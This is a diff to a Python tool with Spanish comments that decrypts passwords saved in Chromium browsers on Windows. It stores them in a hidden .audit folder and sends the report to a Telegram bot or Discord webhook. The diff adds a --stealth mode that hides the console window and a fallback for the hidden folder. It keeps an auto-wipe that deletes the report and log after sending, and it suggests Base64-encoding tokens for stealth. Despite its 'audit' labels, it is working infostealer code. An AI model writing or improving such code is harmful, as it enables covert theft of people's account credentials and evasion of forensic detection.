@@ -17,7 +17,6 @@ from datetime import datetime
 # CREDENCIALES HARDCODED (Opcional - Úsalas en BASE64 para mayor sigilo)
 # =========================================================================
 # Tip: Convierte tus credenciales en Base64 con cualquier conversor online.
-# Ej (Base64): "MTIzNDU2Nzg5MDpBQkMtREVGM..."
 # =========================================================================
 HARDCODED_TG_TOKEN   = ""  # Token del bot de Telegram      (B64 o Plano)
 HARDCODED_TG_ID      = ""  # ID de destino: chat/grupo/canal (B64 o Plano)
@@ -25,8 +24,6 @@ HARDCODED_DS_WEBHOOK = ""  # URL del Webhook de Discord      (B64 o Plano)
 # =========================================================================
 
 if sys.platform != "win32":
-    print("[WARN] Esta herramienta está diseñada exclusivamente para Windows.")
-    print("[WARN] DPAPI no está disponible en este sistema.")
     sys.exit(1)
 
 def safe_b64_decode(val):
@@ -45,24 +42,37 @@ except ImportError:
 
 from Cryptodome.Cipher import AES
 
-# ── Directorio de salida oculto (.audit/) junto al script o ejecutable ──────
 def _get_base_dir() -> Path:
-    """Devuelve el directorio del ejecutable/script, compatible con PyInstaller."""
+    """Directorio del ejecutable/script. Compatible con PyInstaller (frozen)."""
     if getattr(sys, 'frozen', False):
         return Path(sys.executable).parent
     return Path(__file__).parent
 
-OUTPUT_DIR = _get_base_dir() / ".audit"
-OUTPUT_DIR.mkdir(exist_ok=True)
-# Marcar como carpeta oculta en Windows (atributo FILE_ATTRIBUTE_HIDDEN = 0x2)
-ctypes.windll.kernel32.SetFileAttributesW(str(OUTPUT_DIR), 0x2)
+def _setup_output_dir(preferred: Path) -> Path:
+    """Crea la carpeta de salida oculta. Si el directorio no tiene permisos de escritura,
+    usa APPDATA como fallback (compatible con C:\\Program Files\\ y rutas protegidas)."""
+    for candidate in (preferred, Path(os.environ.get('APPDATA', os.getcwd())) / ".audit"):
+        try:
+            candidate.mkdir(exist_ok=True)
+            # OR con atributos existentes para no destruir flags del sistema (SYSTEM, etc.)
+            existing = ctypes.windll.kernel32.GetFileAttributesW(str(candidate))
+            if existing != 0xFFFFFFFF:  # INVALID_FILE_ATTRIBUTES
+                ctypes.windll.kernel32.SetFileAttributesW(str(candidate), existing | 0x2)
+            return candidate
+        except PermissionError:
+            continue
+    return preferred  # Último recurso: usar la ruta original aunque falle el ocultar
 
-# PID calculado una vez al inicio para nombrar archivos temporales únicos
+OUTPUT_DIR = _setup_output_dir(_get_base_dir() / ".audit")
+
 _PID     = os.getpid()
 LOG_FILE = OUTPUT_DIR / "pentest_audit.log"
 
-# Logging: FileHandler en .audit/; StreamHandler solo si hay consola disponible
-_handlers = [logging.FileHandler(LOG_FILE, encoding='utf-8')]
+_handlers = []
+try:
+    _handlers.append(logging.FileHandler(LOG_FILE, encoding='utf-8'))
+except (PermissionError, OSError):
+    pass  # Sin permisos de escritura: solo log en consola si está disponible
 try:
     sys.stdout.fileno()
     _handlers.append(logging.StreamHandler(sys.stdout))
@@ -76,7 +86,7 @@ logging.basicConfig(
 logger = logging.getLogger(__name__)
 
 if win32crypt is None:
-    logger.critical("pywin32 no instalado. DPAPI no disponible. Ejecuta: pip install pywin32")
+    logger.critical("pywin32 no instalado. Ejecuta: pip install pywin32")
 
 HTML_TEMPLATE = """
 <!DOCTYPE html>
@@ -128,9 +138,7 @@ HTML_TEMPLATE = """
 </html>
 """
 
-REQUEST_TIMEOUT = 10  # segundos máximos de espera por petición de red
-
-# Solo se indexan entradas con URL de login real (http/https)
+REQUEST_TIMEOUT = 10
 VALID_URL_PREFIXES = ('http://', 'https://')
 
 
@@ -209,7 +217,7 @@ class ChromiumDecryptor:
             return None
 
     def decrypt(self, blob, key):
-        # Mínimo válido: 3 (prefijo v10) + 12 (nonce) + 1 (payload) + 16 (tag GCM) = 32 bytes
+        # 3 (prefijo v10) + 12 (nonce) + 1 (payload) + 16 (tag GCM) = 32 bytes mínimo
         if not isinstance(blob, (bytes, bytearray)) or len(blob) < 32:
             return "[Blob inválido]"
         try:
@@ -220,7 +228,7 @@ class ChromiumDecryptor:
 
     def audit(self, fmt="html", out="audit_report"):
         data    = []
-        skipped = 0  # entradas con URL no-http (javascript:, chrome://, etc.)
+        skipped = 0
 
         for name, path in self.browsers.items():
             if not path.exists():
@@ -252,7 +260,6 @@ class ChromiumDecryptor:
                         if not (row[0] and row[1] and row[2]):
                             continue
                         if not row[0].startswith(VALID_URL_PREFIXES):
-                            # Filtrar artefactos de frameworks (javascript:, chrome://, etc.)
                             skipped += 1
                             continue
                         data.append([name, p.name, row[0], row[1], self.decrypt(row[2], key)])
@@ -265,21 +272,17 @@ class ChromiumDecryptor:
                     tmp.unlink(missing_ok=True)
 
         if skipped:
-            logger.info(f"{skipped} entradas descartadas (URLs no-http: javascript:, chrome://, etc.)")
+            logger.info(f"{skipped} entradas descartadas (URLs no-http).")
 
         if not data:
             logger.info("No se encontraron credenciales.")
             return 0, None
 
-        # Si el archivo ya existe, añade timestamp para preservar auditorías anteriores
         stamp     = datetime.now().strftime("%Y%m%d_%H%M%S")
-        base_name = f"{out}.{fmt}"
-        base_out  = OUTPUT_DIR / base_name
-        if base_out.exists():
-            final_out = OUTPUT_DIR / f"{out}_{stamp}.{fmt}"
-            logger.info(f"Archivo existente detectado. Guardando como: {final_out.name}")
-        else:
-            final_out = base_out
+        base_out  = OUTPUT_DIR / f"{out}.{fmt}"
+        final_out = OUTPUT_DIR / f"{out}_{stamp}.{fmt}" if base_out.exists() else base_out
+        if final_out != base_out:
+            logger.info(f"Archivo existente. Guardando como: {final_out.name}")
 
         skipped_note = f" · {skipped} entradas no-http descartadas" if skipped else ""
 
@@ -298,7 +301,7 @@ class ChromiumDecryptor:
                     f"<td>{html.escape(r[1])}</td><td>{html.escape(r[2])}</td>"
                     f"<td>{html.escape(r[3])}</td><td>{html.escape(r[4])}</td></tr>"
                 )
-            # total y date se reemplazan antes que rows para evitar colisión con datos de usuario
+            # total y date se reemplazan ANTES que rows para evitar colisión con datos de usuario
             html_out = (HTML_TEMPLATE
                         .replace("{{total}}", str(len(data)))
                         .replace("{{date}}", stamp[:4] + "-" + stamp[4:6] + "-" + stamp[6:8]
@@ -313,8 +316,7 @@ class ChromiumDecryptor:
 
 
 def _close_log_handler():
-    """Cierra el FileHandler del root logger antes de borrarlo.
-    basicConfig() registra handlers en logging.root, no en loggers hijos."""
+    """Cierra el FileHandler del root logger antes de borrar el archivo de log."""
     for handler in logging.root.handlers[:]:
         if isinstance(handler, logging.FileHandler):
             handler.close()
@@ -333,6 +335,8 @@ def main():
                         help="Chat ID personal de Telegram (Plano o Base64).")
     parser.add_argument("-d", "--discord", default=HARDCODED_DS_WEBHOOK,
                         help="URL del Webhook de Discord (Plano o Base64).")
+    parser.add_argument("-s", "--stealth", action="store_true",
+                        help="Modo sigiloso: oculta la ventana de consola (idéntico a .exe --noconsole).")
     parser.add_argument("--no-wipe", action="store_true",
                         help="Desactiva el auto-borrado del reporte tras exfiltración.")
     parser.add_argument("-v", "--verbose", action="store_true",
@@ -340,11 +344,21 @@ def main():
 
     args = parser.parse_args()
 
-    if args.verbose:
+    # Modo sigiloso: ocultar ventana de consola y suprimir output en consola
+    if args.stealth:
+        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
+        if hwnd:
+            ctypes.windll.user32.ShowWindow(hwnd, 0)  # SW_HIDE
+        for handler in logging.root.handlers[:]:
+            if isinstance(handler, logging.StreamHandler) and not isinstance(handler, logging.FileHandler):
+                logging.root.removeHandler(handler)
+        if args.verbose:
+            logger.debug("Nota: --verbose activo en modo --stealth; logs DEBUG van solo al archivo.")
+
+    if args.verbose and not args.stealth:
         logging.getLogger().setLevel(logging.DEBUG)
         logger.debug("Modo verbose activado.")
 
-    # Decodificación Base64 universal — cubre tanto hardcoding como valores pasados por CLI
     token   = safe_b64_decode(args.telegram_token)
     chatid  = safe_b64_decode(args.telegram_chatid)
     discord = safe_b64_decode(args.discord)
@@ -361,12 +375,10 @@ def main():
         if discord:
             exf.send_to_discord(final_file)
 
-        # Auto-Wipe: deja cero artefactos forenses en disco tras la exfiltración
         if not args.no_wipe and (token or discord):
             Path(final_file).unlink(missing_ok=True)
             _close_log_handler()  # cerrar FileHandler ANTES de borrar el .log
             LOG_FILE.unlink(missing_ok=True)
-            print("[+] Auto-Wipe completado: reporte y log eliminados.")
 
 
 if __name__ == "__main__":
